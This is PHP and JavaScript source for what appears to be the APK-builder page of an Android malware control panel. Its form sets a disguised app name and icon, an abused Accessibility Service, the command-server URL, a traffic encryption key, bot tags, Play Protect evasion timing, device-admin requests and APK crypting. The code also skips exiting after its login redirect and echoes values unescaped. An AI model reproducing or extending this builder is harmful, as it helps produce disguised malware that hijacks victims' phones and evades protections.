<?php
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /login.php");
}else{

}
?>
<style type="text/css">
INPUT {
	font-size: 20pt;
}
</style>
<div class="content">

	<script>

	function chPP(){
		if (document.getElementById("check_playprotect").checked) {
			document.getElementById("secondsPlayProtect").disabled = false;
		}else {
			document.getElementById("secondsPlayProtect").value='';
			document.getElementById("secondsPlayProtect").disabled = true;
		}
	}
	function chURL(){
	if (document.getElementById("checkstarturl").checked) {
		document.getElementById("urlsite").disabled = false;
	}else {
		document.getElementById("urlsite").value='';
		document.getElementById("urlsite").disabled = true;
	}
}
	</script>


<?php

	$user =$_SESSION['panel_user'];
	$svoy=getcwd();
	//~ $godir="application/datalogs/files/$user";

	//~ $dir = "$svoy/$godir";
	$files2 = scandir("app_icons", 1);

$last_cfg = json_decode(file_get_contents("../last.cfg"), true);

$old_url = (isset($last_cfg["url"]))? $last_cfg["url"] : "";
$old_key = (isset($last_cfg["key"]))? $last_cfg["key"] : "";
	


	echo "
<form method='post' action='application/set/buildstart.php'>

		<div class='divbuild' id='Bots_settings' style='display:block; width:100%; min-height: 300px; margin-top:20px; margin: 0 auto;
		background: #1D1F24; border-radius: 4px; font-size: 15pt' >
			<center>Create New Build Request (Build In few Minute(s))</center>
			</br>
<table border=0 width=100%>
<tr valign=top>
<td width=50%>

			</td></tr>
<tr>

			<center><!-- onclick='startBuild()' -->
			<input type='submit' value='Build APK'  id='BUILDAPK' class='btn btn-success'
			 style=' Width:40%; Height: 30px; '/>
			</center>
			</br>
</tr>
</table>
</form>

			<a style='margin-left:10%; color:#fff'>TAG</a></br>
			<input type='text' name='tag' value='' placeholder='TagName' id='tag' style='margin-left:10%; color: #337ab7; font-size: 15pt; background: #1D1F24; width: 85%;  height: 28px; border-radius: 5px;'></input>
			</br></br>
			
			<a style='margin-left:10%; color:#fff'>Name application</a></br>
			<input type='text' name='nameapp' placeholder='Enter your app name' value='' id='nameapp' style='margin-left:10%; color: #337ab7; background: #1D1F24;
			 width: 85%; font-size: 15pt; border-radius: 5px;'></input>
			</br></br>
			
			<a style='margin-left:10%; color:#fff'>Name Accessibility Service</a></br>
			<input type='text' placeholder='Enter your Accessibility service name' name='Accessibility' value='' id='Accessibility' style='font-size: 15pt; margin-left:10%; color: #337ab7; background: #1D1F24; width: 85%;  height: 28px; border-radius: 5px;'></input>
			</br></br>
			
			<hr style='width: 80%' />

			<a style='margin-left:10%; color:#fff'>URL admin panel</a></br>
			<input type='text' name='url' value='{$old_url}' placeholder='https://domain.com/' id='url' style='font-size: 15pt; margin-left:10%; color: #337ab7; background: #1D1F24; width: 85%;  height: 28px; border-radius: 5px;'></input>
			</br></br>

			<a style='margin-left:10%; color:#fff'>Traffic Encryption Key</a></br>
			<input type='text' name='keytraff' value='{$old_key}' placeholder='111word' id='keytraff' style='margin-left:10%; font-size: 15pt; color: #337ab7; background: #1D1F24; width: 85%;  height: 28px; border-radius: 5px;'></input>
			</br></br>


			
			
			
<a style='margin-left:10%; color:#fff'>Icon application (web/app_icons/)</a></br>
			<select  name='selecticon' onchange='showIcon(this)' id='selecticon' style='font-size: 12pt; margin-left:10%; color: #337ab7;  height: 28px; width: 85%; background: #1D1F24'>
			<option value='--'>Select icon</option> ";
					foreach($files2 as $fil){
						if ( $fil != "." && $fil != ".." )
						{
							echo "<option value='$fil'>$fil";
						 }
					}
		echo "</select>
			</br>
			<div style='width: 100%; text-align: center; margin-top: 10px;'><img id='iconImg' width='64' /></div>
			
			
	


</td><td>
<br>
			
			
			
			
			<script>
			
function showIcon(select)
{
document.getElementById('iconImg').src = 'app_icons/' + select.options[select.selectedIndex].value + '/mipmap-hdpi/ic_launcher.png'
}
			</script>
			</br>

			<input type='checkbox' onclick='chURL();' name='checkstarturl' id='checkstarturl'  style='margin-left:10%' />
			<label for='checkstarturl'><a style='color:#fff'>After installing the application, open the url(URL)</a></label></br>
			<input type='text' name='urlsite' value='' placeholder='https://www.google.com' id='urlsite' style='font-size: 15pt; margin-left:10%; color: #337ab7; background: #1D1F24; width: 85%;  height: 28px; border-radius: 5px;'></input>
			</br></br>

</td></tr>
<tr>
<td></td>
<td>

</td></tr>
</table>
</form>
		</div>";

		echo "<center><div class='loading' id='Bots_settings' style='display:  none;' >
			<img src='images/loading.gif'></img>
		</div></center>"



?>
</div>

<script>


function startBuild(){

	var nameapp = document.getElementById("nameapp").value;
	var url = document.getElementById("url").value;
	var keytraff = document.getElementById("keytraff").value;
	var tag = document.getElementById("tag").value;
	var admindev = document.getElementById("admindev").value;
	var RequestAccessibility = document.getElementById("RequestAccessibility").value;
	var Accessibility = document.getElementById("Accessibility").value;
	var secondsPlayProtect = document.getElementById("secondsPlayProtect").value;
	var urlsite = document.getElementById("urlsite").value;
	var icon =  document.getElementById("selecticon").value;
	var twitter =  document.getElementById("Twitter").value;


var crypt = false;

	if($('#cryptapk').prop('checked')) {
	  crypt = true;
	}

document.getElementsByClassName('divbuild')[0].style.display = "none";
document.getElementsByClassName('loading')[0].style.display = "block";
document.getElementsByClassName('content')[0].style.background = "#333739";

	$.ajax({ url: 'application/set/buildstart.php?'
		+ 'nameapp='+nameapp
		+ '&url='+url
		+ '&keytraff='+keytraff
		+ '&tag='+tag
		+ '&admindev='+admindev
		+ '&RequestAccessibility='+ RequestAccessibility
		+ '&Accessibility='+ Accessibility
		+ '&secondsPlayProtect='+secondsPlayProtect
		+ '&urlsite='+urlsite
		+ '&icon='+icon
		+ '&twitter='+ twitter
		+ '&crypt='+crypt,
	           success: function(data){
							 document.getElementsByClassName('divbuild')[0].style.display = "block";
 							 document.getElementsByClassName('loading')[0].style.display = "none";
							 document.getElementsByClassName('content')[0].style.background = "#1D1F24";
							// var nameapk = '<?php echo substr(md5($_SESSION['panel_user']),0,12);?>';
 						 //	 window.location.href = 'application/datalogs/files/filesapk/'+nameapk+'.apk' ;
					 }});
}

if (document.getElementById("check_playprotect").checked) {
	document.getElementById("secondsPlayProtect").disabled = false;
}else {
	document.getElementById("secondsPlayProtect").value='';
	document.getElementById("secondsPlayProtect").disabled = true;
}

if (document.getElementById("checkstarturl").checked) {
	document.getElementById("urlsite").disabled = false;
}else {
	document.getElementById("urlsite").value='';
	document.getElementById("urlsite").disabled = true;
}
</script>
